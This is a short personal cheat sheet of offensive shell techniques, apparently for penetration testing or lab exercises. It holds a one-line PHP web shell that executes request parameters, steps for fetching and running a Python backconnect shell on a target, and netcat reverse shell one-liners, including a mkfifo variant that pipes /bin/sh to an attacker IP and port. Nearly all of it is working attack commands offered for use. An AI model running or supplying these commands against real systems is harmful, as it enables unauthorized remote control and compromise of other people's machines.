Windows & Linux
WHEN MOVING FILES IN FTP, set to binary mode to in order to not mess up a payload or nc.exe 

php cmd shell is in /user/share/webshells/php
<?php echo system($_REQUEST["cmd"]); ?>

Linux 
https://github.com/infodox/python-pty-shells
Use these to create fully interactive shells 

On attack box 
shell_handler -b IP PORT

On target box, wget the file, then execute 
python backconnect.py

Most reliable nc shell for me if direct access is not possible
#Direct
nc -e /bin/sh 10.0.0.1 1234
#If nc -e doesn't support 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
